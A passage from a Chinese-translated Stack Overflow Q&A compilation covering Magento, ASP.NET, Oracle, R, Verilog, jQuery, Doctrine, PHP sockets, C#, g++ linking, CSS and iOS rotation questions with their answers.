<events>
<checkout_cart_product_add_after>
    <observers>
        <namespace_triggerevent>
            <type>singleton</type>       
            <class>NameSpace_TriggerEvent_Model_Observer</class>
            <method>opencartafteradd</method>
        </namespace_triggerevent>
    </observers>
</checkout_cart_product_add_after>
</events> 
```

现在，Observer.php

```
<?php

class NameSpace_TriggerEvent_Model_Observer
{
public function opencartafteradd($observer) {
    $event = $observer->getEvent();
    $product = $event->getProduct(); 
    Mage::getSingleton('core/session')->setOpenMinicart('ON');
 }
} 
```

请注意，我们只是将会话变量设置为 ON。在此之后，将使用少量 javascript 处理最好的 header.phtml 或 footer.phtml （可用于站点上的每个页面：P）。我只是向下切换迷你购物车内容部分并在几秒钟后再次向上切换

```
<script type="text/javascript">
var $k = jQuery.noConflict();
$k(document).ready(function() {
    var screen_width = $k(window).width();
    var openminicart = '<?php echo Mage::getSingleton('core/session')->getOpenMinicart();?>';
    if (screen_width > 780) {
        if (openminicart == 'ON') {
                jQuery("#header-cart").slideToggle('slow');
                jQuery("#header-cart").addClass('skip-active');

                setTimeout(function() {
                    jQuery("#header-cart").slideUp('fast');
                    $k('#header-cart').removeClass('skip-active');
                }, 4000);

        <?php Mage::getSingleton('core/session')->unsOpenMinicart();?>

        }
    }
});
</script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:10:21.900

你说'......添加产品时，如果不将鼠标悬停在“您的购物车”链接上，就无法分辨。'。一定有办法的。触发购物车“下拉”动作的代码是什么？

很可能它是 jQuery.sliedeDown 或类似的。在您的 ajax 调用的成功函数中，您需要执行相同的操作。或者，您可以通过编程方式触发 JavaScript 事件，例如在成功函数中：$('#cart').mouseover()。

# c# - 单击复合控件内的按钮时，Repeater ItemCommand 不会触发

> ID：13841393
> 
> 赞同：1
> 
> 时间：2012-12-12T13:57:24.890
> 
> 标签：c#, asp.net, repeater, composite-controls

我通过以下方式`Repeater`包含嵌套的自定义控件：`CompositeControl`

`Wrapper`

*   `Head`
*   `Body`

```
<asp:UpdatePanel ID="noteArea" UpdateMode="Conditional" ChildrenAsTriggers="false" runat="server" >
    <ContentTemplate>
        <asp:Repeater ID="noteRepeater" runat="server" EnableViewState="true" OnItemDataBound="noteRepeater_ItemDataBound" OnItemCommand="noteRepeater_ItemCommand">
            <ItemTemplate>
                <asp:Button runat="server" CommandName="edit" ID="testButton" />
                <easit:NoteControl ID="noteControl" runat="server" />
            </ItemTemplate>
        </asp:Repeater>
    </ContentTemplate>
</asp:UpdatePanel> 
```

`Head`控件包含两个`Buttons`. 当我单击它们中的任何一个时，都不会调用`ItemCommand`事件。`Repeater`如果我将按钮向右移动到`ItemTemplate`，它可以工作。但我需要让它们保持原样。

将它们冒泡到控制层次结构中的正确方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:11:08.250

您可以让控件引发您的页面（带有中继器）可以侦听的事件。初始化每个控件时，可以提供事件所需的任何信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:00:38.897

这些控件在 ItemTemplate 之外 .. 所以它们真的不能触发 ItemCommand。

ItemCommand 具有特定属性，如果它们在 ItemTemplate 之外，您的按钮将无法使用这些属性（例如，ItemIndex，以确定单击项目的索引）

# oracle - 使用 Toad 将 Excel 电子表格导入 Oracle

> ID：13841399
> 
> 赞同：1
> 
> 时间：2012-12-12T13:57:47.993
> 
> 标签：oracle, excel, import, sequence

我正在尝试使用 Toad 将 Excel 电子表格导入 Oracle。问题是我要导入的表有一个主键字段，我使用“sequence”.nextval 来填充正常的存储过程插入。

使用 Toad 导入向导，我尝试将 'table_seq.nextval' 作为表达式输入，但是当我最后执行向导时，出现错误：无法将类型的变体 (UnicodeString) 转换为类型 (Double)。

那么是否可以通过 Toad 导入向导使用 sequence.nextval 导入 Excel 数据，还是有更好的方法？

我还考虑了让 Excel 通过启动超出当前表中的种子的种子来生成密钥。但是作为 Oracle 的新手，这会扰乱我为表设置的顺序吗？例如，如果在插入之前，下一个可用 ID 是 500，并且 Excel 中的插入插入的行从 500 到 5000，那么下一次执行该表序列的存储过程是否会尝试使用 500？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:05:17.220

`primary key violated`是的，序列将保持在 50，并且在使用存储过程时会出现异常。

那是因为序列没有以任何方式链接到表。并且无法链接。它们是分离的对象。

我看到的最好方法是使用`on insert for each row`将 id 设置为的触发器`nextval`。

代码示例：

```
CREATE OR REPLACE TRIGGER trg_table_name_set_id
  BEFORE INSERT 
  ON table_name
  FOR EACH ROW
BEGIN

  SELECT table_seq.nextval INTO :new.id FROM DUAL; --id would be the id column in your table

--or, if you are on 11g, simply
--:new.id := table_seq.nextval;

END trg_table_name_set_id; 
```

# r - 使用 S3 虚拟类作为 S4 类的插槽，出现错误：得到类“S4”，应该是或扩展类“nls.lm”

> ID：13841400
> 
> 赞同：6
> 
> 时间：2012-12-12T13:58:00.607
> 
> 标签：r, s4, slots

版本：

```
 R version 2.15.2 (2012-10-26)
    Platform: x86_64-apple-darwin9.8.0/x86_64 (64-bit) 
```

我想制作一个使用 nls.lm （包：minpack.lm）函数的输出对象作为插槽的 S4 类：

```
setOldClass("nls.lm")

setClass (
  Class="TestClass",
  representation=representation(
      lmOutput = "nls.lm",
      anumeric = "numeric"
    )
  ) 
```

现在，如果我想在“构造函数”中调用这个类，我可以做这样的事情（对吗？）：

```
myConstructor <- function()
{
  return(new("TestClass"))
}

pippo <- myConstructor()

pippo
An object of class "TestClass"
Slot "lmOutput":
<S4 Type Object>
attr(,".S3Class")
[1] "nls.lm"

Slot "anumeric":
numeric(0) 
```

并且对象“pippo”似乎已正确初始化。

如果我改用此代码，则会出现错误：

```
myConstructor2 <- function()
{
  pippo <- new("TestClass", anumeric=1000)
  return(pippo)
}

pippo <- myConstructor2()
Error in validObject(.Object) : 
 invalid class “TestClass” object: invalid object for slot "lmOutput" in class "TestClass": got class "S4", should be or extend class "nls.lm" 
```

似乎如果我想在新的一些插槽中进行初始化，这会导致 S3 类插槽出现问题？

关于如何避免这个问题的任何线索？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:40:32.573

实际上，无参数构造函数也返回了一个无效对象，只是没有经过测试

```
> validObject(new("TestClass"))
Error in validObject(new("TestClass")) : 
  invalid class "TestClass" object: invalid object for slot "lmOutput"
  in class "TestClass": got class "S4", should be or extend class "nls.lm" 
```

解决方案是提供一个合适的原型，也许

```
setClass (
  Class="TestClass",
  representation=representation(
      lmOutput = "nls.lm",
      anumeric = "numeric"
    ),
  prototype=prototype(
      lmOutput=structure(list(), class="nls.lm")
    )
  ) 
```

# binary - 十六进制到 BCD 转换

> ID：13841404
> 
> 赞同：0
> 
> 时间：2012-12-12T13:58:07.627
> 
> 标签：binary, hex, verilog

我正在尝试在 Verilog 中将十六进制转换为 BCD。我没有使用任何时钟。在我的程序中，我一次输入一个输入并将其转换并显示结果。但是，我的程序给出了未定义的结果。我该如何解决？

```
module HexToBCD(num,result);

input num;

output [7:0]result;

assign result[0]=num%2;
assign num=num/2;

assign result[1]=num%2;
assign num=num/2;

assign result[2]=num%2;
assign num=num/2;

assign result[3]=num%2;
assign num=num/2;

assign result[4]=num%2;
assign num=num/2;

assign result[5]=num%2;
assign num=num/2;

assign result[6]=num%2;
assign num=num/2;

assign result[7]=num%2;
assign num=num/2;

endmodule 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:27:45.693

我看到你的模块有一些不寻常的事情。

1.  `num`是 1 位宽，但您试图将其除以 2。

2.  您正在分配给`input`.

3.  你做同样的任务`num`8次。Verilog 不是这样工作的。所有连续分配都被并行评估。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-12T12:15:14.623

以下代码将 8 位二进制数转换为等效的 BCD。有关该算法的说明，请参阅[此链接](http://www.eng.utah.edu/~nmcdonal/Tutorials/BCDTutorial/BCDConversion.html)。

```
module bcd (
    input [7:0] binary,
    output reg [3:0] hundreds,
    output reg [3:0] tens,
    output reg [3:0] ones);

integer i;
always @(binary) begin
    // set 100's, 10's, and 1's to zero
    hundreds = 4'd0;
    tens = 4'd0;
    ones = 4'd0;

    for (i=7; i>=0; i=i-1) begin
        // add 3 to columns >= 5
        if (hundreds >= 5)
            hundreds = hundreds + 3;
        if (tens >= 5)
            tens = tens + 3;
        if (ones >= 5)
            ones = ones + 3;

        // shift left one
        hundreds = hundreds << 1;
        hundreds[0] = tens[3];
        tens = tens << 1;
        tens[0] = ones[3];
        ones = ones << 1;
        ones[0] = binary[i];
    end
end
endmodule 
```

# mysql - 在 Jquery Mobile 下拉列表中显示来自 mysql 的日期

> ID：13841405
> 
> 赞同：0
> 
> 时间：2012-12-12T13:58:08.237
> 
> 标签：mysql, ajax, html, jquery-mobile

我开始使用 Jquery mobile (JQM) 制作一个用于客户数据库的应用程序。您应该能够创建客户名称、地址等。这些信息随后将存储在 MySQL 数据库中。我控制的部分。现在我想这样做，以便可以再次检索数据库的客户编号和名称，并在 JQM 的下拉菜单中显示它们。所以类似：“SELECT `kundenummer`, `navn` FROM kundeskema ORDER BY id DESC”;

我有我的数据库连接和我的 php 页面，但是如何从我的 sql 语句和我的 html 页面获取信息？知道它正在使用 AJAX，但不知道该怎么做。我知道这是一个相当简单的任务，但它不适合我。

请帮助

莫腾

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:43:34.240

您可以创建一个 PHP 文件，该文件返回您的数据的 JSON 字符串。然后对此 PHP 文件执行 jQuery ajax 调用，并在成功回调中创建元素并将它们添加到 select 元素。

例如：

```
$.ajax({
    url: myValues.php,             
        success: function(data) {                
            template  = //create option elements
            $('#mySelect').html(template);
    }
}); 
```

或者

[https://github.com/tkompare/projects/tree/master/ajaxexample](https://github.com/tkompare/projects/tree/master/ajaxexample)

这是一个列表视图，但想法是一样的

# zend-framework - 尝试运行学说命令时出现“em 未定义错误”

> ID：13841408
> 
> 赞同：0
> 
> 时间：2012-12-12T13:58:23.290
> 
> 标签：zend-framework, configuration, doctrine-orm, command-line-interface

我刚刚设置了一个 ZF2 项目并为 Doctrine2 配置了它，没有问题。它可以工作并且现在只是给我一个错误，因为它找不到我要查询的数据库表。

实体也设置正确，一切都按照[http://www.jasongrimes.org/2012/01/using-doctrine-2-in-zend-framework-2/](http://www.jasongrimes.org/2012/01/using-doctrine-2-in-zend-framework-2/)

所以想使用 CLI 创建表等，但是在运行任何 CLI 命令时我得到

```
[InvalidArgumentException]       
The helper "em" is not defined. 
```

我正在使用的命令

```
php doctrine.php orm:schema-tool:update --dump-sql 
```

正在从文件夹运行教义.php

```
/Library/WebServer/Documents/zf2-Skel-NewProj1/vendor/bin 
```

现在，如果我将 CLI 用于我的 ZF1.11 项目之一，它可以正常工作。

为了让这个工作我必须编辑位于下面的 cli-config.php 文件

```
/Library/WebServer/Documents/zf2-Skel-NewProj1/vendor/doctrine/orm/tools 
```

这个文件的内容是：

```
<?php

require_once '../../lib/vendor/doctrine-common/lib/Doctrine/Common/ClassLoader.php';

$classLoader = new \Doctrine\Common\ClassLoader('Doctrine\ORM', realpath(__DIR__ . '/../../lib'));
$classLoader->register();
$classLoader = new \Doctrine\Common\ClassLoader('Doctrine\DBAL', realpath(__DIR__ . '/../../lib/vendor/doctrine-dbal/lib'));
$classLoader->register();
$classLoader = new \Doctrine\Common\ClassLoader('Doctrine\Common', realpath(__DIR__ . '/../../lib/vendor/doctrine-common/lib'));
$classLoader->register();
$classLoader = new \Doctrine\Common\ClassLoader('Symfony', realpath(__DIR__ . '/../../lib/vendor'));
$classLoader->register();
$classLoader = new \Doctrine\Common\ClassLoader('Entities', __DIR__);
$classLoader->register();
$classLoader = new \Doctrine\Common\ClassLoader('Proxies', __DIR__);
$classLoader->register();

$config = new \Doctrine\ORM\Configuration();
$config->setMetadataCacheImpl(new \Doctrine\Common\Cache\ArrayCache);
$driverImpl = $config->newDefaultAnnotationDriver(array(__DIR__."/Entities"));
$config->setMetadataDriverImpl($driverImpl);

$config->setProxyDir(__DIR__ . '/Proxies');
$config->setProxyNamespace('Proxies');

$connectionOptions = array(
'driver' => 'pdo_sqlite',
'path' => 'database.sqlite'
);

$em = \Doctrine\ORM\EntityManager::create($connectionOptions, $config);

$helpers = new Symfony\Component\Console\Helper\HelperSet(array(
    'db' => new \Doctrine\DBAL\Tools\Console\Helper\ConnectionHelper($em->getConnection()),
    'em' => new \Doctrine\ORM\Tools\Console\Helper\EntityManagerHelper($em)
)); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T23:44:37.013

尝试：

供应商\bin\doctrine-module orm:schema-tool:update --dump-sql

# php - PHP 套接字交替侦听/连接

> ID：13841410
> 
> 赞同：0
> 
> 时间：2012-12-12T13:58:30.647
> 
> 标签：php, sockets

我已经构建了一个小型 PHP 服务器/客户端代码。当我说客户端服务器时，我的意思是它作为客户端和服务器在每种模式下交替运行 5 秒。

现在代码在两台服务器上运行并由 cron 触发。

在极少数情况下，他们设法彼此完美同步，他们要么在最后一微秒建立连接，但到那时 PHP 代码已经传递到客户端模式，或者他们永远无法建立连接。

在这整个舞蹈开始之前，他们会运行一些数据库查询来选择一些信息，这些信息可能很大，也可能很小，而且在它们上永远不会相同，因此在时间上添加一些随机性只会使这种事件发生得更少，但不会完全消失。

有没有人成功地做到过这样的事情？如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T16:04:21.933

你在这里设计了一个[***竞态条件***](http://en.wikipedia.org/wiki/Race_condition)。无论您如何尝试同步这些，最终都会遇到麻烦。

解决这个问题的方法是让每个进程一直充当服务器，并按需执行客户端功能。

# c# - 获取 C# 中只读成员的方法

> ID：13841412
> 
> 赞同：-1
> 
> 时间：2012-12-12T13:58:35.560
> 
> 标签：c#

我有一个类定义，其中定义了一个只读成员。

```
private readonly Dictionary<string, string> map = new Dictionary<string, string>(); 
```

现在为了测试我的设计，我想在它的类定义之外访问这个成员。我正在考虑提供一种`get`方法，但无法编写无错误的语法。

是否可以为成员赋值（使用`new`）并且仍然能够定义其`get`方法？

PS：我是 C# 语言的新手。

**编辑：** 我没有写代码，它只是我从一个已经写好的模块中复制的一个语句。我在模块中进行了一些设计更改，并希望在代码中尽可能少地更改对其进行测试，因此我希望在类外获得该成员的只读访问权限。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:02:18.130

有人可能会争辩说你不应该为类的私有成员编写测试。测试应该只使用公共接口而不依赖于类的内部，因为你应该能够在不破坏任何测试的情况下重构类的内部。

如果您添加一个“仅用于测试”的公共 getter，则无法保证有人会在项目的某个地方开始使用。

如果您真的想公开字典并使用 .NET 4.5，请使用`ReadOnlyDictionary`class 确保调用者不会更改任何内容。

```
public IDictionary<string, string> Map
{
    get { return new ReadOnlyDictionary<string, string>(map); }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:01:11.390

您可以定义一个只读属性以允许公共访问您的字段：

```
private readonly Dictionary<string, string> map = 
    new Dictionary<string, string>();

public Dictionary<string, string> Map
{
    get { return map; }
} 
```

请注意，这只会阻止外部类更改分配给 的实例引用`map`，而不是更改字典本身的内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:00:26.183

只需创建一个简单的 getter

```
public  Dictionary<string, string> Mapping
{
   get { return map; }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:01:15.457

您可以编写一个`public`属性函数来返回`private readonly map`，例如：

```
public Dictionary<string, string> Map { { get { return map; } } } 
```

但是，`Dictionary`仍然是可变的。如果您想要一个只读的`Dictionary`，请参阅这个[SO question](https://stackoverflow.com/questions/678379/is-there-a-read-only-generic-dictionary-available-in-net)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T14:00:45.473

你的意思是这样的？

```
readonly Dictionary<string, string> _map = new Dictionary<string, string>();

public Dictionary<string, string> Map
{
    get { return _map; }
} 
```

你为什么要制作这个变量`readonly`？

* * *

如果您尝试授予对字典中包含的值的访问权限，则可以创建一个公开字典而不允许对其进行修改的方法：

```
public string GetMapValue(string key)
{
    return _map[key];
} 
```

# c++ - G++ 找不到库，除非它是完整路径

> ID：13841415
> 
> 赞同：0
> 
> 时间：2012-12-12T13:59:02.387
> 
> 标签：c++, linker

在 64 位 CentOS 5.8 上安装 EPEL 5 的 boost 后，我​​遇到了奇怪的问题。我不能以其他方式链接，然后提供完整路径。即这有效：

```
g++ ... /usr/lib64/libboost_python.so.5 
```

但是这个找不到`-lboost_python`

```
g++ ... -L/usr/lib64/ -lboost_python 
```

有什么问题？

PS。LD_LIBRARY_PATH 没有帮助。它确实找到了一些库，但即使符号链接到 /usr/lib 也无济于事。我正在构建 64 版本的程序（检查`file *.o`）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:04:56.673

尝试添加符号链接 : `ln -s /usr/lib64/liboost_python.so /usr/lib64/libboost_python.so.5`，然后重试。

# css - 对齐2个没有大小的div

> ID：13841420
> 
> 赞同：1
> 
> 时间：2012-12-12T13:59:26.933
> 
> 标签：css, width, alignment, inline, percentage

**是否可以在没有大小**的第 2 行 div 中自动对齐？目标是获得类似于附加图像的东西。

我无法设置百分比（80% 和 20%），因为内容是动态的。我不能使用桌子。任何的想法？示例：http: [//jsfiddle.net/hKRyG/](http://jsfiddle.net/hKRyG/)

```
<html>
<head>
<style type="text/css">
.navbar {
    width: 500px;
    background: #ccc;    
    display:table;
}

.navbar .breadcrumb {    
    float:left;    
}

.navbar .breadcrumb ul {
    margin: 0;
    padding: 0;
}

.navbar .breadcrumb li {
    list-style: none;
    display: inline;
}

.navbar .navbutton {
    float: right;    
}
</style>
</head>
<body>
<div class="navbar">

<div class="breadcrumb">
<ul>
<li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
<li>-></li>
<li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
<li>-></li>
<li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
<li>-></li>
<li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
</ul>
</div>

<div class="navbutton">
    <input type="button" value="BUTTON" />
</div>

</div>
</body>
</html> 
```

谢谢！

![图片](../Images/ef53a6ac49e02d5efceb01e12e28cd85.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:02:45.673

使用以下内容：

```
<html>
<head>
<style>
.navbar {
width: 500px;
background: #ccc;    
display:table;
float: left;
}

.navbar .breadcrumb {    
float:left;    
}

.navbar .breadcrumb ul {
margin: 0;
padding: 0;
}

.navbar .breadcrumb li {
list-style: none;
display: inline;
}

.navbar .navbutton {
 float: right;    
 }
 </style>
 </head>
 <body>
 <div class="navbar">

 <div class="breadcrumb">
 <ul>
 <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
 <li>-></li>
<li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
 <li>-></li>
 <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
 <li>-></li>
 <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
 </div>

 </div>
 <div class="navbutton">
<input type="button" value="BUTTON" />
 </div>
 <body>
 </html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:14:50.150

给你！要在未定义大小的情况下对齐，您必须使用表格显示属性

```
.navbar {
    width: 500px;
    background: #ccc;    
    display:table;
}

.navbar .breadcrumb ul {
    margin: 0;
    padding: 0;
}

.navbar .breadcrumb li {
    list-style: none;
    display: inline;

}

.navbar ul{
    display: table-cell;
}

.navbutton {
    display: table-cell;
    vertical-align: middle;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:16:42.827

如果您将按钮移动到标记的顶部并给它一个`float: right;`，那么添加`overflow: hidden;`到`<div class="breadcrumb">`按钮应该是向右对齐的，并且面包屑将占据左侧剩余的任何空间。

[jsFiddle](http://jsfiddle.net/hKRyG/1/)

HTML：

```
<div class="navbar">
    <div class="navbutton">
        <input type="button" value="BUTTON" />
    </div>
    <div class="breadcrumb">
        <ul>
            <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
            <li>-></li>
            <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
            <li>-></li>
            <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
            <li>-></li>
            <li>Lorem ipsum dolor sit amet, consectetur adipiscing elit</li>
        </ul>
    </div>
</div>​ 
```

CSS

```
.navbar {
    width: 500px;
    background: #ccc; 
}

.navbar .navbutton {
    float: right;
}

.navbar .breadcrumb { 
    overflow: hidden;
}

.navbar .breadcrumb ul {
    margin: 0;
    padding: 0;
}

.navbar .breadcrumb li {
    list-style: none;
    display: inline;
}​ 
```

# jquery - 在中继器项目上使用 Jquery 切换

> ID：13841423
> 
> 赞同：1
> 
> 时间：2012-12-12T13:59:33.733
> 
> 标签：jquery, asp.net, webforms

我正在使用转发器在我的页面上显示数据，我想使用 jquery 切换来显示/隐藏地址字段以使页面更加用户友好。

这是中继器

```
<asp:Repeater ID="RepeaterPersonBasicData" runat="server">
<ItemTemplate>
<div id="Maindetails" class="dataContentSection" runat="server">
    <div id="Div1" visible="true" runat="server">
        <span id="Span1" class="dataFieldText" runat="server">Name:</span> 
        <span id="Span1444" runat="server"><%# Eval("Name")%></span>
    </div>
    <div id="Div2" visible="true" runat="server">
        <span id="Span3" class="dataFieldText" runat="server">DOB:</span> 
        <span id="Span1443" runat="server"><%# Eval("DOB")%></span>
    </div>
    <div id="Div3" visible="true" runat="server">
        <span id="Span5" class="dataFieldText" runat="server">Age:</span> 
        <span id="Span1442" runat="server"><%# Eval("Age")%></span>
    </div>
</div>
<a href="javascript:void(0);" id="toggleAddressdetails" class="titleText" runat="server">+ Address details</a>
<div id="Addressdetails" class="dataContentSection" runat="server" style="display: none;">
    <div id="Div78" visible="true" runat="server">
        <span id="Span144" class="dataFieldText" runat="server">Address Line 1:</span> 
        <span id="Span246" runat="server"><%# Eval("Address1")%></span>
    </div>
    <div id="Div80" visible="true" runat="server">
        <span id="Span148" class="dataFieldText" runat="server">>Address Line 2:</span> 
        <span id="Span147" runat="server"><%# Eval("Address2")%></span>
    </div>
    <div id="Div82" visible="true" runat="server">
        <span id="Span152" class="dataFieldText" runat="server">>Address Line 3:</span> 
        <span id="Span151" runat="server"><%# Eval("Address3")%></span>
    </div>
    <div id="Div84" visible="true" runat="server">
        <span id="Span156" class="dataFieldText" runat="server">>Address Line 4:</span> 
        <span id="Span155" runat="server"><%# Eval("Address4")%></span>
    </div>
</div>

<br />
</ItemTemplate>
</asp:Repeater> 
```

本质上，我想包含一些这样的 javascript，以便可以为每个中继器项目启用切换。我尝试使用 .ClientID 但这在中继器内不起作用。只是为了证明它可以工作，我尝试过包含 javascript，它确实有效，但显然只适用于前五个中继器项目。

```
<script type="text/javascript">
    $(function () {
        $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl00_toggleAddressdetails').click(function () {
            $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl00_Addressdetails').toggle();
        });
    });
    $(function () {
        $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl01_toggleAddressdetails').click(function () {
            $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl01_Addressdetails').toggle();
        });
    });
    $(function () {
        $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl02_toggleAddressdetails').click(function () {
            $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl02_Addressdetails').toggle();
        });
    });
    $(function () {
        $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl03_toggleAddressdetails').click(function () {
            $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl03_Addressdetails').toggle();
        });
    });
    $(function () {
        $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl04_toggleAddressdetails').click(function () {
            $('#ctl00_cphBody_ctl00_ctl00_RepeaterPersonBasicData_ctl04_Addressdetails').toggle();
        });
    });
</script> 
```

我当然愿意采用不同的方法来实现在转发器中包含可折叠内容的相同目标。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:15:54.287

最简单的方法是不使用 ID，而是为您的选择器使用类名。例如，以下是基于您的代码的一些 HTML：

```
<div id="repeater">
<!-- item 1 -->
<div class="dataContentSection">
    <div>Name</div>
</div>
<a href="javascript:void(0);" class="titleText toggler">+ Address details</a>
<div class="dataContentSection" style="display: none;">
    <div>Address Line 1:</div>
    <div>Address Line 2:</div>
    <div>Address Line 3:</div>
</div>
<!-- item 2 -->
<div class="dataContentSection">
    <div>Name</div>
</div>
<a href="javascript:void(0);" class="titleText toggler">+ Address details</a>
<div class="dataContentSection" style="display: none;">
    <div>Address Line 1:</div>
    <div>Address Line 2:</div>
    <div>Address Line 3:</div>
</div>
<!-- etc -->
</div> 
```

请注意，为简单起见，我删除了 ID。我还在锚标签中添加了类名“toggler”。

然后将其用于您的脚本：

```
<script type="text/javascript">
$(function() {
    $('a.toggler').on('click', function() {
        $('+ div', this).toggle();
    });
});
</script> 
```

执行此脚本时，它会将事件处理程序绑定到类名为“toggler”的所有锚元素。事件处理程序在执行时只需调用单个元素的 DIV 兄弟上的 jQuery toggle() 方法。

这是一个完整的 JS 小提琴：http: [//jsfiddle.net/P5tZX/](http://jsfiddle.net/P5tZX/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:05:12.960

一种快速的方法是使用类而不是 id 选择器。这应该作为首发：

```
$(function () {
  $('a.titleText').on('click', function (ev) {
    $(this).next('div').toggle();
  });
}); 
```

然后，我将优化事件侦听器以使用[委托](http://api.jquery.com/on/)，而不是为每个链接创建一个事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:39:27.617

我认为，此代码对您有帮助。它隐藏所有“.dataContentSection”项目，然后在目标 itemTemplate 中打开“.dataContentSection”元素。

```
$(function () {
  $('a.titleText').on('click', function (ev) {
$(".dataContentSection").each(function(){
$(this.hide();
});
    $(this).next('div').toggle();
  });
}); 
```

# xcode - 强制横向应用程序调用supportedInterfaceOrientations（再次）

> ID：13841425
> 
> 赞同：0
> 
> 时间：2012-12-12T13:59:36.050
> 
> 标签：xcode, uinavigationcontroller, ios6, rotation, landscape

我目前在应用商店中有一个几乎只有横向的 iPad 应用程序，并且在处理旋转锁定方面遇到了一些新的 iOS 6 方式的问题。

它是一个基于 UINavigationController 的应用程序，并且由于 iOS 承担了大部分责任，`rootViewController`因此`UIWindow`我必须手动询问每个 UIViewController 它想要什么旋转。

因为我有大量`UIViewController`的手动向每个控制器添加代码来执行此操作会花费我很长时间，所以我对 UINavigationController 和 UIViewController 进行了扩展以覆盖这些调用，并且我可以手动设置我想要的视图阻止肖像和什么允许它。

UINavigationController-Extension.m：

```
//
//  UINavigationController-Extension.m
//  DrivingInstructor
//
//  Created by Liam Nichols on 06/12/2012.
//  Copyright (c) 2012 Liam Nichols. All rights reserved.
//

#import "UINavigationController-Extension.h"

@implementation UINavigationController (Extension)

-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return [self.topViewController shouldAutorotateToInterfaceOrientation:interfaceOrientation];
}

-(NSUInteger)supportedInterfaceOrientations
{
    return self.topViewController.supportedInterfaceOrientations;
}

-(BOOL)shouldAutorotate
{
    return YES;
}

@end

@implementation UIViewController (Extension)

-(BOOL)shouldAutorotate
{
    return NO;
}

-(NSUInteger)supportedInterfaceOrientations
{
    if ([[self portraitClasses] containsObject:NSStringFromClass([self class])])
    {
        return UIInterfaceOrientationMaskAll;
    }
    return UIInterfaceOrientationMaskLandscape;
}

-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation
{
    if ([[self portraitClasses] containsObject:NSStringFromClass([self class])])
    {
        return YES;
    }
    return (toInterfaceOrientation == UIInterfaceOrientationLandscapeLeft || toInterfaceOrientation == UIInterfaceOrientationLandscapeRight);
}

-(NSArray*)portraitClasses
{
    static NSArray *classes;
    if (classes == nil)
    {
        classes = @[ @"MockTestController", @"PLUILibraryViewController", @"PhotoViewController" ];
    }
    return classes;
}

@end 
```

一开始我认为这已经解决了这个问题（我还在 info.plist 中将应用程序锁定为横向，以便它启动到横向，然后在应用程序委托中我调用`application:supportedInterfaceOrientationsForWindow:`并返回所有方向，以便我的选择视图可以访问纵向如果需要的话。

所以这似乎奏效了，所有锁定到 lanscape 的视图控制器都接受我在扩展类中指定的 3。我正在监视扩展，每当我推到新控制器时，它都会检查方向并将应用程序锁定到指定方向。

然而，我发现但似乎无法解决的一个问题是，例如，当我在允许的视图控制器上处于纵向状态并尝试弹回前一个视图控制器时，锁定为横向`supportedInterfaceOrientations`的内容不再被调用，并且视图应该锁定到横向的不是（这会导致问题）。

根据苹果文件，这是它应该如何工作的，因为处理旋转的责任被传递给了 rootViewController，并且由于用户没有旋转他们的设备并且 rootViewController 没有改变，所以不需要请求`supportedInterfaceOrientations`..

我的问题是，有没有办法让应用程序强制调用`supportedInterfaceOrientations`或者我应该以不同的方式执行此操作？

感谢阅读，如果我能找到最后一个错误的解决方案，那么这段代码可能是对同样情况的人的一个很好的参考。

- - -编辑 - - -

正在做一些进一步的调查，发现就在`viewWillAppear:`函数之前，`supportedInterfaceOrientations`实际上实际上是在我试图弹回的控制器上调用的，并且确实返回了正确的掩码`UIInterfaceOrientationMaskLandscape`以尝试使其自动从纵向旋转回来，但它似乎没有听这个回应，仍然留下`UIViewController`肖像......

所以这意味着我不需要`supportedInterfaceOrientations`再次调用，而是让设备旋转回横向！

* * *

